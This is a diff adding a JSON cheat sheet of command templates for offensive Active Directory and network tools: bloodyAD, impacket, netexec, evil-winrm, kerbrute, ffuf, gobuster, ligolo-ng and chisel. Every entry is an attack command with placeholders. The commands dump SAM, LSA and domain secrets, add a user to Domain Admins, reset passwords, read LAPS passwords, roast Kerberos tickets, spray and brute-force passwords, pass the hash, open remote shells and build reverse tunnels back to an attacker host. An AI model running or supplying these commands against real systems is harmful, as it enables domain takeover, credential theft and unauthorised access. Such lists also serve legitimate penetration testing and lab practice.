@@ -1,0 +1,284 @@
+[
+  {
+    "tool": "bloodyAD",
+    "tags": ["AD", "LDAP", "bloodhound", "recon"],
+    "commands": [
+      {
+        "desc": "DNS Query",
+        "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap dnsquery"
+      },
+      {
+        "desc": "Get Domain Users",
+        "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} getObjectAttributes Users"
+      },
+      {
+        "desc": "Get Domain Admins",
+        "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} getObjectAttributes 'Domain Admins' member"
+      },
+      {
+        "desc": "Add user to group",
+        "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} addObjectToGroup {{TARGET_USER}} 'Domain Admins'"
+      },
+      {
+        "desc": "Change user password",
+        "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} changePassword {{TARGET_USER}} 'NewPass123!'"
+      },
+      {
+        "desc": "Get LAPS password",
+        "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} getObjectAttributes {{TARGET}} ms-Mcs-AdmPwd"
+      }
+    ]
+  },
+  {
+    "tool": "impacket",
+    "tags": ["kerberos", "SMB", "AD", "RPC", "relay", "dump"],
+    "commands": [
+      {
+        "desc": "SecretsDump (password)",
+        "cmd": "impacket-secretsdump {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}"
+      },
+      {
+        "desc": "SecretsDump (hash)",
+        "cmd": "impacket-secretsdump -hashes :{{HASH}} {{DOMAIN}}/{{USER}}@{{IP}}"
+      },
+      {
+        "desc": "GetTGT (request ticket)",
+        "cmd": "impacket-getTGT {{DOMAIN}}/{{USER}}:{{PASS}}"
+      },
+      {
+        "desc": "GetUserSPNs (Kerberoasting)",
+        "cmd": "impacket-GetUserSPNs {{DOMAIN}}/{{USER}}:{{PASS}} -dc-ip {{IP}} -request"
+      },
+      {
+        "desc": "GetNPUsers (AS-REP Roasting)",
+        "cmd": "impacket-GetNPUsers {{DOMAIN}}/ -usersfile users.txt -dc-ip {{IP}} -no-pass"
+      },
+      {
+        "desc": "PSExec (shell)",
+        "cmd": "impacket-psexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}"
+      },
+      {
+        "desc": "SMBClient (list shares)",
+        "cmd": "impacket-smbclient {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}"
+      },
+      {
+        "desc": "WMIExec (shell)",
+        "cmd": "impacket-wmiexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}"
+      },
+      {
+        "desc": "NTLMRelayx (relay attack)",
+        "cmd": "impacket-ntlmrelayx -tf targets.txt -smb2support -i"
+      },
+      {
+        "desc": "Lookupsid (RID brute)",
+        "cmd": "impacket-lookupsid {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}"
+      }
+    ]
+  },
+  {
+    "tool": "netexec",
+    "tags": ["SMB", "WinRM", "LDAP", "RDP", "spray", "exec"],
+    "commands": [
+      {
+        "desc": "SMB Recon",
+        "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}}"
+      },
+      {
+        "desc": "SMB Password Spray",
+        "cmd": "netexec smb {{IP}} -u users.txt -p {{PASS}} --continue-on-success"
+      },
+      {
+        "desc": "SMB List Shares",
+        "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} --shares"
+      },
+      {
+        "desc": "Dump SAM",
+        "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} --sam"
+      },
+      {
+        "desc": "Dump LSA",
+        "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} --lsa"
+      },
+      {
+        "desc": "Execute command",
+        "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} -x 'whoami'"
+      },
+      {
+        "desc": "WinRM check",
+        "cmd": "netexec winrm {{IP}} -u {{USER}} -p {{PASS}}"
+      },
+      {
+        "desc": "LDAP recon",
+        "cmd": "netexec ldap {{IP}} -u {{USER}} -p {{PASS}} --bloodhound -ns {{IP}} -c All"
+      },
+      {
+        "desc": "RDP check",
+        "cmd": "netexec rdp {{IP}} -u {{USER}} -p {{PASS}}"
+      },
+      {
+        "desc": "Pass-the-Hash SMB",
+        "cmd": "netexec smb {{IP}} -u {{USER}} -H {{HASH}}"
+      }
+    ]
+  },
+  {
+    "tool": "evil-winrm",
+    "tags": ["WinRM", "shell", "exec", "upload", "download"],
+    "commands": [
+      {
+        "desc": "Connect (password)",
+        "cmd": "evil-winrm -i {{IP}} -u {{USER}} -p {{PASS}}"
+      },
+      {
+        "desc": "Connect (hash)",
+        "cmd": "evil-winrm -i {{IP}} -u {{USER}} -H {{HASH}}"
+      },
+      {
+        "desc": "Connect with SSL",
+        "cmd": "evil-winrm -i {{IP}} -u {{USER}} -p {{PASS}} -S"
+      },
+      {
+        "desc": "Connect with scripts dir",
+        "cmd": "evil-winrm -i {{IP}} -u {{USER}} -p {{PASS}} -s /opt/privesc/"
+      },
+      {
+        "desc": "Connect with executables dir",
+        "cmd": "evil-winrm -i {{IP}} -u {{USER}} -p {{PASS}} -e /opt/privesc/"
+      }
+    ]
+  },
+  {
+    "tool": "kerbrute",
+    "tags": ["kerberos", "bruteforce", "spray", "enum", "AD"],
+    "commands": [
+      {
+        "desc": "User enumeration",
+        "cmd": "kerbrute userenum --dc {{IP}} -d {{DOMAIN}} users.txt"
+      },
+      {
+        "desc": "Password spray",
+        "cmd": "kerbrute passwordspray --dc {{IP}} -d {{DOMAIN}} users.txt {{PASS}}"
+      },
+      {
+        "desc": "Brute force single user",
+        "cmd": "kerbrute bruteuser --dc {{IP}} -d {{DOMAIN}} passwords.txt {{USER}}"
+      },
+      {
+        "desc": "Brute force all users",
+        "cmd": "kerbrute bruteforce --dc {{IP}} -d {{DOMAIN}} creds.txt"
+      }
+    ]
+  },
+  {
+    "tool": "ffuf",
+    "tags": ["web", "fuzz", "enum", "dirs", "vhost", "params"],
+    "commands": [
+      {
+        "desc": "Directory fuzz",
+        "cmd": "ffuf -u http://{{IP}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
+      },
+      {
+        "desc": "File fuzz (extensions)",
+        "cmd": "ffuf -u http://{{IP}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.html,.bak"
+      },
+      {
+        "desc": "Vhost fuzz",
+        "cmd": "ffuf -u http://{{IP}}/ -H 'Host: FUZZ.{{DOMAIN}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0"
+      },
+      {
+        "desc": "GET param fuzz",
+        "cmd": "ffuf -u 'http://{{IP}}/page?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
+      },
+      {
+        "desc": "POST data fuzz",
+        "cmd": "ffuf -u http://{{IP}}/login -X POST -d 'username=FUZZ&password={{PASS}}' -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -H 'Content-Type: application/x-www-form-urlencoded'"
+      },
+      {
+        "desc": "With cookie auth",
+        "cmd": "ffuf -u http://{{IP}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -b 'session={{PASS}}'"
+      }
+    ]
+  },
+  {
+    "tool": "gobuster",
+    "tags": ["web", "fuzz", "enum", "dirs", "dns"],
+    "commands": [
+      {
+        "desc": "Directory enum",
+        "cmd": "gobuster dir -u http://{{IP}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
+      },
+      {
+        "desc": "Directory enum (extensions)",
+        "cmd": "gobuster dir -u http://{{IP}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,html,bak"
+      },
+      {
+        "desc": "DNS subdomain enum",
+        "cmd": "gobuster dns -d {{DOMAIN}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+      },
+      {
+        "desc": "Vhost enum",
+        "cmd": "gobuster vhost -u http://{{IP}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain"
+      }
+    ]
+  },
+  {
+    "tool": "ligolo-ng",
+    "tags": ["pivot", "tunnel", "proxy", "network"],
+    "commands": [
+      {
+        "desc": "Start proxy (attacker)",
+        "cmd": "sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up && ./proxy -selfcert -laddr 0.0.0.0:11601"
+      },
+      {
+        "desc": "Run agent (target Linux)",
+        "cmd": "./agent -connect {{IP}}:11601 -ignore-cert"
+      },
+      {
+        "desc": "Run agent (target Windows)",
+        "cmd": ".\\agent.exe -connect {{IP}}:11601 -ignore-cert"
+      },
+      {
+        "desc": "Add route to pivot network",
+        "cmd": "sudo ip route add 172.16.0.0/24 dev ligolo"
+      },
+      {
+        "desc": "Start tunnel (in ligolo console)",
+        "cmd": "session\n[select session]\nstart"
+      },
+      {
+        "desc": "Add listener (reverse shell back)",
+        "cmd": "listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444"
+      }
+    ]
+  },
+  {
+    "tool": "chisel",
+    "tags": ["pivot", "tunnel", "proxy", "socks", "port-forward"],
+    "commands": [
+      {
+        "desc": "SOCKS5 server (attacker)",
+        "cmd": "./chisel server -p 8080 --reverse --socks5"
+      },
+      {
+        "desc": "SOCKS5 client (target)",
+        "cmd": "./chisel client {{IP}}:8080 R:socks"
+      },
+      {
+        "desc": "Remote port forward",
+        "cmd": "./chisel client {{IP}}:8080 R:{{PORT}}:127.0.0.1:{{PORT}}"
+      },
+      {
+        "desc": "Local port forward",
+        "cmd": "./chisel client {{IP}}:8080 {{PORT}}:TARGET_IP:{{PORT}}"
+      },
+      {
+        "desc": "Run server (target side)",
+        "cmd": "./chisel server -p {{PORT}} --socks5"
+      },
+      {
+        "desc": "Connect to target server",
+        "cmd": "./chisel client {{IP}}:{{PORT}} socks"
+      }
+    ]
+  }
+]
